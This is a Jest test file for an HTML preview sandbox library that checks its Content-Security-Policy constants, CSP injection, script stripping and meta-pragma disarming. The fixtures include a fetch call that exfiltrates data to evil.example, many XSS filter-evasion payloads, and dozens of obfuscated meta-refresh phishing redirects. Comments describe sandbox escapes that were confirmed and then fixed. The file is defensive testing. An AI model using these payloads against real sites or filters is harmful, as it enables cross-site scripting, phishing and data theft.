import {
  CHART_PREVIEW_CSP,
  PDF_PREVIEW_CSP,
  PREVIEW_CSP,
  PREVIEW_CSP_INLINE,
  PREVIEW_CSP_LIVE,
  PREVIEW_VIEWPORT,
  injectPreviewCsp,
  prepareHtmlRunDocument,
  stripScripts,
} from "@/lib/previewSandbox";

/** The CSP meta prepareHtmlRunDocument writes: the one pragma the Run tab keeps. */
const RUN_CSP_TAG = `<meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP_LIVE}">`;

/**
 * How many times "http-equiv" sits where an attribute name can start (after
 * whitespace, "/" or a quote), so a browser could read it as a pragma. Test inputs
 * hold the word only as an attribute name, so 0 means no live pragma is left; in a
 * Run document the one left must be the app's own CSP.
 */
function pragmaNames(html: string): number {
  return (html.match(/(?<![\w-])http-equiv/gi) ?? []).length;
}

describe("PREVIEW_VIEWPORT", () => {
  it("does not lock pinch zoom or system text scaling", () => {
    expect(PREVIEW_VIEWPORT).toContain("width=device-width");
    expect(PREVIEW_VIEWPORT).not.toContain("maximum-scale");
  });
});

describe("PREVIEW_CSP", () => {
  it("blocks network egress and forms, allows inline scripts only", () => {
    expect(PREVIEW_CSP).toContain("default-src 'none'");
    expect(PREVIEW_CSP).toContain("script-src 'unsafe-inline'");
    expect(PREVIEW_CSP).toContain("style-src 'unsafe-inline'");
    expect(PREVIEW_CSP).toContain("connect-src 'none'");
    expect(PREVIEW_CSP).toContain("form-action 'none'");
    expect(PREVIEW_CSP).toContain("base-uri 'none'");
    expect(PREVIEW_CSP).toContain("sandbox allow-scripts");
  });

  it("PREVIEW_CSP_INLINE keeps egress locks without meta sandbox", () => {
    expect(PREVIEW_CSP_INLINE).toContain("connect-src 'none'");
    expect(PREVIEW_CSP_INLINE).not.toContain("sandbox");
    expect(PREVIEW_CSP.startsWith(PREVIEW_CSP_INLINE)).toBe(true);
  });

  it("PREVIEW_CSP_LIVE allowlists known CDNs instead of open https", () => {
    expect(PREVIEW_CSP_LIVE).toContain("https://cdn.jsdelivr.net");
    expect(PREVIEW_CSP_LIVE).toContain("https://unpkg.com");
    expect(PREVIEW_CSP_LIVE).toContain("https://cdnjs.cloudflare.com");
    expect(PREVIEW_CSP_LIVE).toContain("https://fonts.googleapis.com");
    expect(PREVIEW_CSP_LIVE).toContain("https://fonts.gstatic.com");
    expect(PREVIEW_CSP_LIVE).toContain("form-action 'none'");
    expect(PREVIEW_CSP_LIVE).toContain("frame-src 'none'");
    expect(PREVIEW_CSP_LIVE).not.toContain("sandbox");
    expect(PREVIEW_CSP_LIVE).not.toContain("https: http:");
    const tokens = PREVIEW_CSP_LIVE.split(/[;\s]+/);
    expect(tokens).not.toContain("https:");
    expect(tokens).not.toContain("http:");
  });
});

describe("prepareHtmlRunDocument", () => {
  it("injects live CSP and stay-on-page script", () => {
    const out = prepareHtmlRunDocument(
      "<!DOCTYPE html><html><head></head><body><h1>Hi</h1></body></html>",
    );
    expect(out).toContain("Content-Security-Policy");
    expect(out).toContain("https://cdn.jsdelivr.net");
    expect(out).not.toContain("connect-src https: http:");
    expect(out).toContain("addEventListener(\"click\"");
    expect(out).toContain("<h1>Hi</h1>");
  });

  it("overrides window.open, location.assign/replace, and location.href", () => {
    const out = prepareHtmlRunDocument(
      "<!DOCTYPE html><html><head></head><body></body></html>",
    );
    expect(out).toContain("window.open = function");
    expect(out).toContain("loc.assign = function");
    expect(out).toContain("loc.replace = function");
    expect(out).toContain("Object.defineProperty(loc, \"href\"");
  });

  it("disarms meta-refresh and keeps its own CSP and stay script", () => {
    const out = prepareHtmlRunDocument(
      '<html><head><meta http-equiv="refresh" content="0;url=https://evil.example/phish"></head><body>ok</body></html>',
    );
    expect(pragmaNames(out)).toBe(1);
    expect(out).toContain(`${RUN_CSP_TAG}<script>`);
  });

  it("injects the stay script immediately after the CSP meta, before user head scripts", () => {
    const out = prepareHtmlRunDocument(
      "<html><head><script>window.user=1</script></head><body></body></html>",
    );
    const cspAt = out.indexOf("Content-Security-Policy");
    const stayAt = out.indexOf("window.open = function");
    const userAt = out.indexOf("window.user=1");
    expect(cspAt).toBeGreaterThan(-1);
    expect(stayAt).toBeGreaterThan(cspAt);
    expect(userAt).toBeGreaterThan(stayAt);
  });
});

describe("PREVIEW_CSP egress details", () => {
  it("blocks https on script/style (external script-src exfiltration)", () => {
    // connect-src 'none' alone is not enough: <script src="https://evil/?…">
    // still fires a GET. Inline-only preview — no CDN hosts.
    const scriptSrc = PREVIEW_CSP.match(/script-src\s+([^;]+)/)?.[1].trim();
    const styleSrc = PREVIEW_CSP.match(/style-src\s+([^;]+)/)?.[1].trim();
    expect(scriptSrc).toBe("'unsafe-inline'");
    expect(styleSrc).toBe("'unsafe-inline'");
    for (const value of [scriptSrc, styleSrc]) {
      expect(value).not.toContain("https:");
      expect(value).not.toContain("*");
    }
  });

  it("blocks https on img/font/media (passive GET exfiltration)", () => {
    // connect-src 'none' alone is not enough: <img src="https://attacker/…">
    // still fires a GET when the DOM parses. Mermaid inherits this CSP.
    const imgSrc = PREVIEW_CSP.match(/img-src\s+([^;]+)/)?.[1].trim();
    const fontSrc = PREVIEW_CSP.match(/font-src\s+([^;]+)/)?.[1].trim();
    const mediaSrc = PREVIEW_CSP.match(/media-src\s+([^;]+)/)?.[1].trim();
    expect(imgSrc).toBe("data: blob:");
    expect(fontSrc).toBe("data:");
    expect(mediaSrc).toBe("data: blob:");
    for (const value of [imgSrc, fontSrc, mediaSrc]) {
      expect(value).not.toContain("https:");
      expect(value).not.toContain("*");
    }
  });
});

describe("PDF_PREVIEW_CSP", () => {
  it("allows a blob worker (pdf.js worker is vendored inline) and blocks all network egress", () => {
    // pdf.js + its worker are vendored and inlined; the worker is built from a
    // Blob URL at runtime, so the CSP must allow `worker-src blob:` while
    // keeping `connect-src 'none'` (no network fetch is needed — the PDF bytes
    // are inlined as base64).
    expect(PDF_PREVIEW_CSP).toContain("worker-src blob:");
    expect(PDF_PREVIEW_CSP).toContain("connect-src 'none'");
  });

  it("keeps the rest of the policy as locked-down as PREVIEW_CSP", () => {
    expect(PDF_PREVIEW_CSP).toContain("default-src 'none'");
    expect(PDF_PREVIEW_CSP).toContain("script-src 'unsafe-inline'");
    expect(PDF_PREVIEW_CSP).not.toContain("script-src 'unsafe-inline' https:");
    expect(PDF_PREVIEW_CSP).toContain("form-action 'none'");
    expect(PDF_PREVIEW_CSP).toContain("base-uri 'none'");
    expect(PDF_PREVIEW_CSP).toContain("sandbox allow-scripts");
  });

  it("does NOT allow connect-src to any origin (no exfiltration, no CDN)", () => {
    // The connect-src must be 'none' — not 'https:' (any HTTPS origin), not a
    // CDN host, not '*'. pdf.js no longer fetches anything at runtime.
    const connectSrcMatch = PDF_PREVIEW_CSP.match(/connect-src\s+([^;]+)/);
    expect(connectSrcMatch).not.toBeNull();
    const connectSrcValue = connectSrcMatch![1].trim();
    expect(connectSrcValue).toBe("'none'");
    expect(connectSrcValue).not.toBe("https:");
    expect(connectSrcValue).not.toBe("*");
    expect(connectSrcValue).not.toContain("cdnjs.cloudflare.com");
  });

  it("lets a PDF fetch nothing: no file and no network in any directive", () => {
    // A PDF is untrusted and pdf.js has had script-capable bugs: images, fonts
    // and media load only from the page itself (data:, blob:).
    expect(PDF_PREVIEW_CSP).not.toMatch(/file:|https?:|\*/);
    for (const directive of ["img-src", "font-src", "media-src"]) {
      const value = new RegExp(`${directive}\\s+([^;]+)`).exec(PDF_PREVIEW_CSP)?.[1].trim();
      expect(value?.split(/\s+/).every((source) => source === "data:" || source === "blob:")).toBe(true);
    }
  });

  it("allows worker-src only for blob: (not arbitrary origins)", () => {
    const workerSrcMatch = PDF_PREVIEW_CSP.match(/worker-src\s+([^;]+)/);
    expect(workerSrcMatch).not.toBeNull();
    const workerSrcValue = workerSrcMatch![1].trim();
    expect(workerSrcValue).toBe("blob:");
  });
});

describe("CHART_PREVIEW_CSP", () => {
  it("allows unsafe-eval so Vega can compile expressions, without network egress", () => {
    expect(CHART_PREVIEW_CSP).toContain("script-src 'unsafe-inline' 'unsafe-eval'");
    expect(CHART_PREVIEW_CSP).toContain("connect-src 'none'");
    expect(CHART_PREVIEW_CSP).toContain("default-src 'none'");
    expect(CHART_PREVIEW_CSP).toContain("form-action 'none'");
    expect(CHART_PREVIEW_CSP).toContain("base-uri 'none'");
  });

  it("does not open script-src to https (eval is chart-only, not CDN)", () => {
    const scriptSrc = CHART_PREVIEW_CSP.match(/script-src\s+([^;]+)/)?.[1].trim();
    expect(scriptSrc).toBe("'unsafe-inline' 'unsafe-eval'");
    expect(scriptSrc).not.toContain("https:");
  });

  it("does not leak eval onto the user-HTML preview CSP", () => {
    expect(PREVIEW_CSP).not.toContain("unsafe-eval");
    expect(PREVIEW_CSP).toContain("script-src 'unsafe-inline'");
  });
});

describe("injectPreviewCsp", () => {
  it("injects the CSP meta right after an existing <head>", () => {
    const html = "<!DOCTYPE html><html><head><title>x</title></head><body></body></html>";
    const out = injectPreviewCsp(html);
    expect(out).toContain(
      `<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>x</title></head>`,
    );
  });

  it("injects a <head> with CSP after <html> when no head present", () => {
    const html = "<!DOCTYPE html><html><body><p>hi</p></body></html>";
    const out = injectPreviewCsp(html);
    expect(out).toContain(
      `<html><head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"></head><body>`,
    );
  });

  it("wraps bare HTML into a document with the CSP", () => {
    const out = injectPreviewCsp("<p>hello</p>");
    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"></head>`);
    expect(out).toContain("<p>hello</p>");
  });

  it("only injects a single CSP meta (idempotent-ish for one pass)", () => {
    const html = "<html><head></head><body></body></html>";
    const out = injectPreviewCsp(html);
    const count = (out.match(/Content-Security-Policy/g) || []).length;
    expect(count).toBe(1);
  });

  it("strips scripts that appear before <head> (meta CSP would not cover them)", () => {
    const html =
      "<html><script>window.pwned=1</script><head><title>x</title></head><body></body></html>";
    const out = injectPreviewCsp(html);
    expect(out).not.toContain("window.pwned");
    expect(out).toContain(`content="${PREVIEW_CSP}"`);
  });

  // BUG FIX (was a confirmed sandbox escape): a decoy "<head" inside a
  // <script> comment (or <style>/HTML comment/<textarea>/<title>) that
  // appears before the real <head> used to fool the plain-text search into
  // splicing the CSP meta into that inert block instead — leaving the real
  // document with no CSP at all, and the attacker's script running with
  // full network egress despite connect-src 'none'. Each case below is the
  // exact confirmed PoC shape; the CSP must land inside the REAL <head>,
  // and the decoy content must never be treated as if it were real markup.
  it("is not fooled by a decoy <head> inside a <script> comment", () => {
    const html =
      '<!DOCTYPE html><html><script>\n// <head>\nfetch("https://evil.example/steal?x=" + document.title);\n</script>\n<head><title>Legit</title></head><body>Hello</body></html>';
    const out = injectPreviewCsp(html);
    // The CSP must be inside the real <head>, immediately before <title>.
    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Legit</title></head>`);
    // The attacker's script must be gone entirely (it's "before head").
    expect(out).not.toContain("evil.example");
  });

  it("is not fooled by a decoy <head> inside a <style> block", () => {
    const html =
      '<!DOCTYPE html><html><style>/* <head> */ body { color: red; }</style><head><title>Real</title></head><body></body></html>';
    const out = injectPreviewCsp(html);
    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Real</title></head>`);
  });

  it("is not fooled by a decoy <head> inside an HTML comment", () => {
    const html =
      "<!DOCTYPE html><html><!-- <head> --><head><title>Real</title></head><body></body></html>";
    const out = injectPreviewCsp(html);
    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Real</title></head>`);
  });

  it("is not fooled by a decoy <head> inside a <textarea>", () => {
    const html =
      "<!DOCTYPE html><html><textarea>sample: <head> tag</textarea><head><title>Real</title></head><body></body></html>";
    const out = injectPreviewCsp(html);
    expect(out).toContain(`<head><meta http-equiv="Content-Security-Policy" content="${PREVIEW_CSP}"><title>Real</title></head>`);
  });
});

describe("stripScripts", () => {
  it("strips plain <script> tags and on*= handlers (baseline, unchanged)", () => {
    const out = stripScripts('<script>alert(1)</script><div onclick="alert(2)">x</div>');
    expect(out).not.toContain("<script>");
    expect(out).not.toContain("alert(1)");
    expect(out).not.toContain("onclick");
  });

  // BUG FIX (was a confirmed bypass): "/" is a valid inter-attribute
  // separator in HTML, not just whitespace, so <svg/onload=...> fires
  // automatically on render — a well-known, real-world XSS-filter-evasion
  // technique. The old regex required literal whitespace before "on\w+".
  it("strips on*= handlers separated by '/' instead of whitespace", () => {
    const out = stripScripts('<svg/onload=alert(document.domain)>');
    expect(out).not.toContain("onload");
    expect(out).not.toContain("alert(document.domain)");
  });

  // BUG FIX (was a confirmed bypass): browsers HTML-decode an iframe's
  // srcdoc attribute before parsing it as the iframe's own document, so an
  // entity-encoded <script> inside srcdoc executes on load with zero
  // clicks. The old code only looked for the literal string "<script",
  // never inside an attribute value.
  it("strips iframe srcdoc containing an entity-encoded script", () => {
    const out = stripScripts(
      '<iframe srcdoc="&lt;script&gt;fetch(&#39;https://evil.example&#39;)&lt;/script&gt;"></iframe>',
    );
    expect(out).not.toContain("srcdoc");
  });

  it("strips javascript: URLs from href/src/action/formaction/data attributes", () => {
    const cases = [
      '<a href="javascript:alert(1)">click</a>',
      "<a href='javascript:alert(1)'>click</a>",
      '<img src="javascript:alert(1)">',
      '<form action="javascript:alert(1)"><button formaction="javascript:alert(1)">go</button></form>',
      '<object data="javascript:alert(1)"></object>',
    ];
    for (const html of cases) {
      const out = stripScripts(html);
      expect(out.toLowerCase()).not.toContain("javascript:");
    }
  });

  it("strips javascript: URLs obfuscated with embedded whitespace/control characters", () => {
    const out = stripScripts('<a href="java\tscript:alert(1)">click</a>');
    expect(out.toLowerCase()).not.toContain("javascript:");
  });

  it("strips vbscript: URLs", () => {
    const out = stripScripts('<a href="vbscript:msgbox(1)">click</a>');
    expect(out.toLowerCase()).not.toContain("vbscript:");
  });

  it("disarms zero-click meta-refresh redirects", () => {
    const out = stripScripts(
      '<meta http-equiv="refresh" content="0;url=https://evil.example/phish">',
    );
    expect(pragmaNames(out)).toBe(0);
  });

  it("leaves ordinary safe links and images untouched", () => {
    const out = stripScripts(
      '<a href="https://example.com">link</a><img src="https://example.com/x.png"><img src="data:image/png;base64,AAAA">',
    );
    expect(out).toContain('href="https://example.com"');
    expect(out).toContain('src="https://example.com/x.png"');
    expect(out).toContain('src="data:image/png;base64,AAAA"');
  });

  it("strips data:text/html URLs while keeping data:image", () => {
    const out = stripScripts(
      '<a href="data:text/html,<script>alert(1)</script>">x</a><img src="data:image/png;base64,AAAA">',
    );
    expect(out.toLowerCase()).not.toContain("data:text/html");
    expect(out).toContain('src="data:image/png;base64,AAAA"');
  });

  it("strips script end tags with junk before >", () => {
    const out = stripScripts("<script>alert(1)</script\t\n bar><p>ok</p>");
    expect(out.toLowerCase()).not.toContain("alert");
    expect(out).toContain("<p>ok</p>");
  });
});

// A2: the meta-refresh strip was one regex that wanted whitespace before
// http-equiv and a literal "refresh", so "/" between attributes, an encoded
// value or a ">" in an earlier quoted value walked past it. Every shape below
// must leave no live pragma on either path: the Run tab (its own CSP aside) and
// the stripped copy that Open in browser / Share hand to the system browser.
describe("meta pragmas (A2)", () => {
  const EVIL = "https://evil.example/phish";
  const REFRESH_SHAPES: [string, string][] = [
    ["'/' before the attribute", `<meta/http-equiv=refresh content="0;url=${EVIL}">`],
    ["a tab before the attribute", `<meta\thttp-equiv=refresh content="0;url=${EVIL}">`],
    ["a newline before the attribute", `<meta\nhttp-equiv=refresh content="0;url=${EVIL}">`],
    ["a form feed before the attribute", `<meta\fhttp-equiv=refresh content="0;url=${EVIL}">`],
    ["a carriage return before the attribute", `<meta\rhttp-equiv=refresh content="0;url=${EVIL}">`],
    ["'/' between attributes", `<meta content="0;url=${EVIL}"/http-equiv=refresh>`],
    ["no space after a quoted value", `<meta content="0;url=${EVIL}"http-equiv=refresh>`],
    ["an upper-case tag, name and value", `<META HTTP-EQUIV="REFRESH" CONTENT="0;URL=${EVIL}">`],
    ["mixed case, single quotes", `<MeTa Http-Equiv='ReFresh' content='0;url=${EVIL}'>`],
    ["an unquoted value", `<meta http-equiv=refresh content=0;url=${EVIL}>`],
    ["whitespace around '='", `<meta http-equiv = "refresh" content = "0;url=${EVIL}">`],
    ["a decimal entity in the value", `<meta http-equiv="&#114;efresh" content="0;url=${EVIL}">`],
    ["a hex entity in the value", `<meta http-equiv="re&#x66;resh" content="0;url=${EVIL}">`],
    [
      "a fully encoded value",
      `<meta http-equiv="&#x72;&#x65;&#x66;&#x72;&#x65;&#x73;&#x68;" content="0;url=${EVIL}">`,
    ],
    [
      "extra attributes before and after",
      `<meta name="x" data-a=1 http-equiv="refresh" content="0;url=${EVIL}" id=y>`,
    ],
    ["'>' in an earlier double-quoted value", `<meta content="a>b" http-equiv=refresh>`],
    [
      "'>' in an earlier single-quoted value",
      `<meta name='a>b' http-equiv="refresh" content="0;url=${EVIL}">`,
    ],
    ["a self-closing tag", `<meta http-equiv="refresh" content="0;url=${EVIL}" />`],
    ["the attribute twice", `<meta http-equiv=x HTTP-EQUIV=refresh content="0;url=${EVIL}">`],
    ["no closing '>' (the app's next text closes it)", `<p>hi</p><meta http-equiv=refresh content="0;url=${EVIL}"`],
    [
      "a dead tag in a comment running over a live one",
      `<!-- <meta title=' --><meta http-equiv=refresh content="0;url=${EVIL}"><p>'</p>`,
    ],
  ];

  // Every http-equiv a preview could meet, not only refresh: none is needed
  // (the charset comes from how the page is loaded) and some act on their own.
  const OTHER_PRAGMAS: [string, string][] = [
    ["set-cookie", `<meta http-equiv="set-cookie" content="sid=1; path=/">`],
    ["a second content-security-policy", `<meta http-equiv="Content-Security-Policy" content="default-src *">`],
    ["default-style", `<meta http-equiv="default-style" content="dark">`],
    ["x-dns-prefetch-control", `<meta http-equiv="x-dns-prefetch-control" content="on">`],
    ["content-type", `<meta http-equiv="content-type" content="text/html; charset=iso-2022-jp">`],
  ];

  describe.each([...REFRESH_SHAPES, ...OTHER_PRAGMAS])("%s", (_shape, meta) => {
    it("prepareHtmlRunDocument keeps only its own CSP", () => {
      const out = prepareHtmlRunDocument(
        `<!DOCTYPE html><html><head>${meta}</head><body><p>ok</p>${meta}</body></html>`,
      );
      expect(pragmaNames(out)).toBe(1);
      expect(out).toContain(`<head>${RUN_CSP_TAG}<script>(function () {`);
    });

    it("prepareHtmlRunDocument disarms it in a bare fragment", () => {
      const out = prepareHtmlRunDocument(`<p>ok</p>${meta}`);
      expect(pragmaNames(out)).toBe(1);
      expect(out).toContain(`${RUN_CSP_TAG}<script>`);
    });

    it("stripScripts leaves no pragma", () => {
      expect(pragmaNames(stripScripts(`<p>ok</p>${meta}<p>after</p>`))).toBe(0);
    });
  });

  it("stripScripts does not turn a removed meta into a live <script>", () => {
    // On main, deleting the meta joined "<scr" and "ipt>" into a real script tag.
    const out = stripScripts(`<scr<meta http-equiv=refresh content="0;url=${EVIL}">ipt>alert(1)</script>`);
    expect(out).not.toMatch(/<script/i);
    expect(pragmaNames(out)).toBe(0);
  });

  it("stripScripts disarms a pragma that its URL filter pieces together", () => {
    // Removing the javascript: href joins "http-equ" and "iv" into http-equiv.
    const out = stripScripts(`<meta http-equ href="javascript:x"iv=refresh content="0;url=${EVIL}">`);
    expect(pragmaNames(out)).toBe(0);
  });

  it("stripScripts disarms a pragma that its script filter pieces together", () => {
    const out = stripScripts(`<me<script></script>ta http-equiv=refresh content="0;url=${EVIL}">`);
    expect(pragmaNames(out)).toBe(0);
  });

  it("prepareHtmlRunDocument disarms a pragma pieced together before <head>", () => {
    // Scripts before <head> are dropped (the CSP would not cover them), which
    // joins "<me" and "ta ..." into a meta the old pre-pass never saw.
    const out = prepareHtmlRunDocument(
      `<html><me<script></script>ta http-equiv=refresh content="0;url=${EVIL}"><head></head><body></body></html>`,
    );
    expect(pragmaNames(out)).toBe(1);
    expect(out).toContain(`<head>${RUN_CSP_TAG}<script>`);
  });

  it("puts the stay script after the real CSP, not a decoy in a comment", () => {
    const out = prepareHtmlRunDocument(
      '<html><!-- <meta http-equiv="Content-Security-Policy" content="x"> --><head></head><body></body></html>',
    );
    expect(out).toContain(`<head>${RUN_CSP_TAG}<script>(function () {`);
    expect(pragmaNames(out)).toBe(1);
  });

  it("puts the stay script after the real CSP even when the page copies that tag", () => {
    const out = prepareHtmlRunDocument(
      `<html><!-- ${RUN_CSP_TAG} --><head></head><body></body></html>`,
    );
    expect(out).toContain(`<!-- ${RUN_CSP_TAG} -->`);
    expect(out).toContain(`<head>${RUN_CSP_TAG}<script>(function () {`);
  });

  it("stripScripts leaves ordinary metas and prose about http-equiv alone", () => {
    const html =
      '<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1">' +
      "<p>The http-equiv attribute: <code>&lt;meta http-equiv=&quot;refresh&quot;&gt;</code></p>";
    expect(stripScripts(html)).toBe(html);
  });
});
